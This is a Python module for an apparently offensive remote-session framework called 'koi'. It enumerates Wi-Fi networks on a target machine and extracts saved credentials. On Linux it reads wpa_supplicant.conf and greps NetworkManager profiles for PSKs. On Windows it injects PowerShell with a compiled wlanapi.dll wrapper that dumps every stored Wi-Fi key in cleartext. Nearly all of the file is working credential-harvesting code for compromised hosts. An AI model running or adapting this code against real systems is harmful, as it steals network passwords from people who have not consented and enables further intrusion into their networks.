from __future__ import annotations

import re
from koi.modules.blueprint import KoiModule
from koi.utils.config import TIMEOUTS


class WifiEnumModule(KoiModule):
    name        = "wifi"
    description = "Enumerate nearby Wi-Fi networks and extract stored credentials."
    category    = "Enumeration"
    platform    = ["linux", "windows_ps"]
    usage       = "wifi <id>"

    def run(self) -> None:
        if self.session.os_type == "linux":
            self._run_linux()
        else:
            self._run_windows()

    # ------------------------------------------------------------------ linux

    def _run_linux(self) -> None:
        self.status("Analyzing Wi-Fi...")

        with self.spinner("Scanning Wi-Fi networks..."):
            nmcli_res = self._try_exec(
                "nmcli --fields BARS,SSID,SECURITY device wifi list 2>/dev/null",
                timeout=TIMEOUTS["exec_query"],
            )

        if nmcli_res and "SSID" in nmcli_res:
            scanned: dict[str, str] = {}
            for line in nmcli_res.splitlines()[1:]:
                lc = line.strip()
                if not lc:
                    continue
                parts = re.split(r'\s{2,}', lc)
                ssid = parts[1].strip() if len(parts) > 1 else ""
                if not ssid or ssid == "--":
                    ssid = "hidden"
                key, n = ssid, 1
                while key in scanned:
                    n += 1
                    key = f"{ssid} ({n})"
                scanned[key] = lc
            if scanned:
                self.box("Detected networks (via nmcli)", scanned)
        else:
            self.warn("nmcli returned no results (check interface status).")

        self.status("Checking Wi-Fi configuration files...")
        creds: dict[str, str] = {}

        wpa_conf = self._try_exec(
            "cat /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null",
            timeout=TIMEOUTS["exec_query"],
        )
        if wpa_conf and "network=" in wpa_conf:
            for block in re.findall(r'network=\{([^\}]+)\}', wpa_conf, re.DOTALL):
                ssid_m = re.search(r'ssid="([^"]+)"', block)
                psk_m  = re.search(r'psk="([^"]+)"', block)
                if ssid_m:
                    psk = psk_m.group(1) if psk_m else "[Key missing]"
                    creds[f"wpa_supplicant ({ssid_m.group(1)})"] = f"PSK: {psk}"

        nm_raw = self._try_exec(
            "grep -rH '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null",
            timeout=TIMEOUTS["exec_query"],
        )
        if nm_raw:
            for line in nm_raw.splitlines():
                m = re.match(r'.*/([^/]+?)(?:\.nmconnection)?:psk=(.+)', line)
                if m:
                    creds[f"NetworkManager ({m.group(1)})"] = f"PSK: {m.group(2).strip()}"

        if creds:
            self.box("Extracted profiles", creds)
        else:
            self.status("No readable profiles found in standard locations.")

        self.success("Wi-Fi analysis complete.")

    # ---------------------------------------------------------------- windows

    def _run_windows(self) -> None:
        self.status("Analyzing Wi-Fi...")

        with self.spinner("Checking Wi-Fi interface..."):
            iface_raw = self._win_query(
                f"(netsh wlan show interfaces) -join '{self.REC_SEP}'",
                timeout=TIMEOUTS["exec_query"],
            )
        if iface_raw.strip():
            info: dict[str, str] = {}
            for line in iface_raw.split(self.REC_SEP):
                line = line.strip()
                if ':' not in line or line.startswith('-'):
                    continue
                k, _, v = line.partition(':')
                k, v = k.strip(), v.strip()
                if k and v:
                    info[k] = v
            if info:
                self.box("Wi-Fi Interface", info)

        with self.spinner("Extracting stored Wi-Fi credentials..."):
            raw = self._win_query(
                "&{"
                "$_wt=Add-Type -TypeDefinition '"
                "using System;using System.Runtime.InteropServices;"
                "public class KWlan{"
                "[DllImport(\"wlanapi.dll\")]public static extern int WlanOpenHandle(int v,IntPtr r,out int n,out IntPtr h);"
                "[DllImport(\"wlanapi.dll\")]public static extern int WlanCloseHandle(IntPtr h,IntPtr r);"
                "[DllImport(\"wlanapi.dll\")]public static extern int WlanGetProfile(IntPtr h,"
                "[MarshalAs(UnmanagedType.LPStruct)]Guid g,"
                "[MarshalAs(UnmanagedType.LPWStr)]string p,IntPtr r,"
                "[MarshalAs(UnmanagedType.LPWStr)]out string x,ref int f,out int a);"
                "}' -PassThru;"
                "$_v=0;$_h=[IntPtr]::Zero;"
                "if([KWlan]::WlanOpenHandle(2,[IntPtr]::Zero,[ref]$_v,[ref]$_h)-ne 0){return};"
                "$_g=[Guid]((netsh wlan show interfaces|"
                "Select-String '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}').Matches[0].Value);"
                "$ps=@((netsh wlan show profiles 2>$null)|"
                "Where-Object{$_ -match '^\\s+.+:\\s+\\S'}|"
                "ForEach-Object{($_ -split ':\\s+',2)[-1].Trim()});"
                "if(!$ps -or $ps.Count -eq 0){[KWlan]::WlanCloseHandle($_h,[IntPtr]::Zero)|Out-Null;return};"
                "$r=@();"
                "foreach($p in $ps){"
                "$_x='';$_f=4;$_a=0;"
                "if([KWlan]::WlanGetProfile($_h,$_g,$p,[IntPtr]::Zero,[ref]$_x,[ref]$_f,[ref]$_a)-eq 0 -and $_x){"
                "[xml]$_d=$_x;"
                "$a=$_d.WLANProfile.MSM.security.authEncryption.authentication;"
                "if(!$a){$a='?'};"
                "$k=$_d.WLANProfile.MSM.security.sharedKey.keyMaterial;"
                "if(!$k){$k='[none]'};"
                f"$r+=$p+'{self.FIELD_SEP}'+$a+'{self.FIELD_SEP}'+$k"
                "}};"
                "[KWlan]::WlanCloseHandle($_h,[IntPtr]::Zero)|Out-Null;"
                f"$r -join '{self.REC_SEP}'"
                "}",
                timeout=TIMEOUTS["exec_query"] * 3,
            )
        if raw.strip():
            creds: dict[str, str] = {}
            other: list[list[str]] = []
            for entry in raw.split(self.REC_SEP):
                entry = entry.strip()
                if self.FIELD_SEP not in entry:
                    continue
                parts = entry.split(self.FIELD_SEP, 2)
                if len(parts) < 3:
                    continue
                name, auth, key = [p.strip() for p in parts]
                if key and key != "[none]":
                    creds[name] = f"{key}  ({auth})"
                else:
                    other.append([name, auth])
            if creds:
                self.box("Wi-Fi Credentials (cleartext)", creds)
            if other:
                self.table("Saved profiles (no key recovered)", ["SSID", "Auth"], other)
        else:
            self.status("No Wi-Fi profiles found.")

        from koi.utils.ui import yesno
        if yesno("Scan nearby networks? (opens Wi-Fi panel on target)", prechosen=False):
            with self.spinner("Scanning nearby networks..."):
                scan = self._win_query(
                    "Start-Process explorer.exe -ArgumentList 'ms-availablenetworks:'"
                    " -ErrorAction SilentlyContinue;"
                    f"Start-Sleep -Seconds 6;(netsh wlan show networks mode=bssid) -join '{self.REC_SEP}'",
                    timeout=TIMEOUTS["exec_query"] * 3,
                )
        else:
            with self.spinner("Listing cached nearby networks..."):
                scan = self._win_query(
                    f"(netsh wlan show networks mode=bssid) -join '{self.REC_SEP}'",
                    timeout=TIMEOUTS["exec_query"],
                )
        if scan.strip():
            networks: dict[str, str] = {}
            cur: str | None = None
            det: list[str] = []
            for line in scan.split(self.REC_SEP):
                line = line.strip()
                if not line:
                    continue
                sm = re.match(r'SSID\s+\d+\D*:\s*(.*)', line)
                if sm:
                    if cur is not None:
                        networks[cur] = '  '.join(det)
                    ssid = sm.group(1).strip() or "hidden"
                    key, n = ssid, 1
                    while key in networks:
                        n += 1
                        key = f"{ssid} ({n})"
                    cur = key
                    det = []
                elif cur and ':' in line:
                    k, _, v = line.partition(':')
                    k = k.strip().lower()
                    if 'signal' in k:
                        det.append(f"signal={v.strip()}")
                    elif 'auth' in k:
                        det.append(f"auth={v.strip()}")
            if cur is not None:
                networks[cur] = '  '.join(det)
            if networks:
                self.box("Nearby networks", networks)

        self.success("Wi-Fi analysis complete.")
